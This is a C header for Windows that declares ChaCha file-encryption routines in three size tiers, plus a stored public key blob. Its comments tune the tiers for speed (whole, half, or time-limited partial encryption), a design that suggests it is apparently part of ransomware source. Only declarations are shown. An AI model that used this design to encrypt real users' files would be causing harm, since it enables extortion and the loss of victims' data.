#pragma once
#include "windows.h"
#include <iostream>
#include <stdio.h>
#include "Chacha.h"
#ifndef __Crypto_h__
#define __Crypto_h__
extern HCRYPTPROV hCryptProv;
extern BYTE publicKeyBlob[148];

int cryptInit();

void cryptCleanUp();

// 9406ms for 1024mb file, 4706ms for 512mb, 1833ms for 200mb, 924ms for 100mb, 474ms for 50mb, 9ms for 1mb, 92ms for 10mb
// anything less than 10mb. Encrypt full -> time from 0ms to 92ms
int chachaFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce);

// 10mb to 100mb -> only encrypt half the files -> time from 45ms to 500ms
int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce);

// anything above 100mb. Limit to 1.5 seconds
int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce);
#endif

